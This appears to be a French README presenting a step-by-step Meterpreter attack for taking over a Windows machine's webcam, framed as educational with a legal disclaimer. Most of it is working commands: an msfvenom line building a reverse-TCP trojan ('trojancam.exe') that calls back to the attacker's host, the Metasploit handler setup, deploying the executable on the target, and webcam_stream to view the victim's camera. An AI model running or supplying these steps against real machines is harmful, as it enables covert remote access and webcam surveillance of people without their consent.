# 🎯 Contrôle de Webcam via Meterpreter – Démonstration Éducative

Ce projet démontre comment établir une session Meterpreter sur une machine Windows cible afin d'accéder à sa webcam. Il est destiné à des fins éducatives et de sensibilisation à la cybersécurité.

## 🧰 Outils utilisés

- Metasploit Framework (préinstallé sur Kali Linux)​
- Python 3 (pour l'envoi du payload)​
- Wireshark (optionnel, pour l'analyse du trafic réseau)​
- Ettercap (optionnel, pour les attaques de type Man-in-the-Middle)

## ⚠️ Avertissement
Ce projet est destiné à des fins éducatives uniquement. L'utilisation de ces techniques sans le consentement explicite des parties concernées est illégale et contraire à l'éthique. L'auteur décline toute responsabilité en cas d'utilisation abusive.

## 🚀 Étapes pour reproduire l'attaque

### 1. Générer le Payload avec Metasploit
Utiliser ```msfvenom``` pour créer un exécutable malveillant qui établira une connexion inversée vers votre machine Kali :
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip locale attaquant} LPORT=4444 -f exe -o trojancam.exe
```
- LHOST : adresse IP de votre machine Kali​
- LPORT : port d'écoute sur Kali (4444 par défaut)

### 2. Configurer un listener sur Kali (port d'écoute)
Lancer Metasploit et configurer un handler pour écouter les connexions entrantes :
```bash
msfconsole
```
Puis après lancement de Metasploit dans le terminal :
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST {ip locale attaquant}
set LPORT 4444
exploit
```

### 3. Déployer le payload sur la machine cible
Transférer trojancam.exe sur la machine cible et l'exécuter. Cela établira une session Meterpreter entre la cible et la machine Kali.

### 4. Accéder à la Webcam de la Cible
Une fois la session Meterpreter établie, activer la webcam de la cible :​
```bash
webcam_stream
```
Cela ouvrira une interface web diffusant le flux vidéo de la webcam de la cible.

## Crédits

###[iciamyplant/camera_hack](https://github.com/iciamyplant/camera_hack)
Répertoire initial qui m'a permis de comprendre le fonctionnement de Metasploit.
